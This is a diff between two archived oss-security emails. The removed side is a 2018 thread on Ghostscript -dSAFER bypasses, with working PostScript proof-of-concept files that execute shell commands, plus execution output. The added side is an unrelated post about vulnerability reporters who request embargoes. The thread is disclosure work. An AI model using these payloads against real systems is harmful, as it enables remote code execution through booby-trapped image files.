@@ -1,168 +1,20 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/08/23/4
-Message-ID: <CAJ_zFkL5Tus9-4PJOTPGNwg0BVCd+NkgC9B_HM9ev+UTAS=59Q@mail.gmail.com>
-Date: Wed, 22 Aug 2018 21:24:36 -0700
-From: Tavis Ormandy <taviso@...gle.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2018/01/18/1
+Message-ID: <07f40446-1917-893c-2a87-b0d7990579b2@redhat.com>
+Date: Thu, 18 Jan 2018 17:10:05 +0100
+From: Florian Weimer <fweimer@...hat.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Re: More Ghostscript Issues: Should we disable PS coders in policy.xml by default?
+Subject: How to deal with reporters who don't want their bugs fixed?
 Content-Type: text/plain; charset=utf-8
 
-I've verified that on centos7 at least, just opening nautilus on Downloads
-is enough to trigger code execution via evince-thumbnailer.
+Subject says it all: What do you do if you receive a vulnerability 
+report, and the reporter requests an embargo at some time in the future 
+because that's when their paper/conference presentation/patent 
+submission is scheduled?
 
-I just called it test.tiff and used <a download href=test.tiff> in Chrome,
-opening nautilus executed the command immediately.
+The obvious approach is to find a prior public report of essentially the 
+same bug and fix that (which will work surprisingly often), but let's 
+assume that this isn't the case.
 
-I think we should kill (or at least trim the mime types)
-in /usr/share/thumbnailers/evince.thumbnailer.
-
-Tavis.
-
-On Wed, Aug 22, 2018 at 5:35 PM Tavis Ormandy <taviso@...gle.com> wrote:
-
-> Thanks Amit, that's scary, it looks like they're working on it right now.
->
-> FWIW, I figured out how to reproduce the original bug here in
-> evince-thumbnailer:
->
-> $ cat test.jpeg
-> %!PS
-> a0
-> { null restore } stopped { pop } if
-> (ppmraw) selectdevice
-> legal
-> mark /OutputFile (%pipe%id) currentdevice putdeviceprops
-> showpage
-> $ strace -q -feexecve evince-thumbnailer  test.jpeg foo.out
-> execve("/usr/bin/evince-thumbnailer", ["evince-thumbnailer", "test.jpeg",
-> "foo.out"], 0x7ffeed3010d0 /* 65 vars */) = 0
-> execve("/bin/sh", ["sh", "-c", "id"], 0x7ffcf3ea8d18 /* 65 vars */) = 0
->
-> Tavis.
->
-> On Wed, Aug 22, 2018 at 12:30 PM AmitB <me@...tbl.com> wrote:
->
->> I also took a look a copule weeks ago at few of the patches for your
->> previous bugs from 2 years ago, and found that one of them is incomplete
->> and still allowing RCE (
->> https://bugs.ghostscript.com/show_bug.cgi?id=697178)
->>
->> POC:
->> ------------------
->> $ cat poc.jpg
->> %!PS
->> << (ICCProfilesDir) (%pipe%id > /dev/) >> .setuserparams
->> currentdevice null true mark /OutputICCProfile (tty)
->> .putdeviceparams
->> showpage
->> $ identify poc.jpg
->> uid=1000(amit) gid=1000(amit) groups=1000(amit)
->>
->> After reviewing all of the comments in the original bug report I saw that
->> you actually mentioned this issue, but it was not taken under
->> consideration/forgotten for some reason.
->> So effectively a public RCE PoC has been avaliable for GhostScript for
->> almost 2 years.
->>
->> I opened a report two weeks ago at bugs.ghostscript.com:
->> 699623 Incomplete fix for #697178 Allowing -dSAFER bypass
->>
->> But I got no response from them until today.
->> If you have others channels of contact with them please let them know
->> about
->> this one too.
->>
->> On Tue, Aug 21, 2018 at 11:12 PM, Tavis Ormandy <taviso@...gle.com>
->> wrote:
->>
->> > Thanks Alex.
->> >
->> > FWIW, not all of these are visible, but I've started filing bugs, I'll
->> file
->> > a few more today and then let the developers work through the most
->> serious
->> > ones.
->> >
->> > 699654 /invalidaccess checks stop working after a failed restore
->> > 699655 missing type checking in setcolor
->> > 699656 LockDistillerParams boolean missing type checks
->> > 699659 missing type check in type checker (!)
->> > 699657 .tempfile SAFER restrictions seem to be broken
->> > 699658 Bypassing PermitFileReading by handling undefinedfilename error
->> > 699660 shading_param incomplete type checking
->> > 699661 pdf14 garbage collection memory corruption
->> > 699662 calling .bindnow causes sideeffects
->> > 699663 .setdistillerkeys memory corruption
->> > 699664 corrupt device object after error in job
->> >
->> > I'm working on getting reproducers working for the developers for all
->> bugs.
->> >
->> > On Tue, Aug 21, 2018 at 8:22 AM Alex Gaynor <alex.gaynor@...il.com>
->> wrote:
->> >
->> > > A small note. Both ImageMagick and GraphicsMagick process various file
->> > > formats that can nest a different image file inside of them. These are
->> > very
->> > > frequently implemented with a call to ReadImage(), with no checking
->> that
->> > > it's the expected file format. (As a result, the fuzzer finds various
->> > > impressive chains, with sometimes 3 different image formats nested
->> inside
->> > > of each other).
->> > >
->> > > The conclusion of this is that people _must not_ attempt to do their
->> own
->> > > format detection and then pass the data to IM/GM, because this can be
->> > > bypassed with nested formats. It's imperative that GS truly be
->> disabled
->> > > with either policy.xml or by uninstall GS.
->> > >
->> > > Alex
->> > >
->> > > On Tue, Aug 21, 2018 at 11:01 AM Bob Friesenhahn <
->> > > bfriesen@...ple.dallas.tx.us> wrote:
->> > >
->> > > > On Tue, 21 Aug 2018, Tavis Ormandy wrote:
->> > > > >
->> > > > > I think those thumbnails should be disabled, but you've probably
->> > > noticed
->> > > > I
->> > > > > think everything related to untrusted ghostscript should be
->> disabled
->> > > :-)
->> > > >
->> > > > I have posted to the GraphicsMagick Announcements mailing list
->> > > > regarding your findings (with a link to this list) and suggested
->> that
->> > > > a fool-proof solution is that Ghostscript should be uninstalled.
->> > > >
->> > > > Uninstalling Ghostscript entirely might cause software using libgs
->> to
->> > > > not execute at all unless a stub library is put in its place.
->> > > >
->> > > > Dependencies on Ghostscript are much larger than one would initially
->> > > > think due to Postscript being the traditional output from Unix
->> > > > software for "printing" and thus it is used as an intermediate
->> format
->> > > > in order to convert between formats.  EPS content is also embedded
->> in
->> > > > some other formats.
->> > > >
->> > > > Bob
->> > > > --
->> > > > Bob Friesenhahn
->> > > > bfriesen@...ple.dallas.tx.us,
->> > > http://www.simplesystems.org/users/bfriesen/
->> > > > GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
->> > > >
->> > >
->> > >
->> > > --
->> > > All that is necessary for evil to succeed is for good people to do
->> > nothing.
->> > >
->> >
->>
->
-
+Thanks,
+Florian
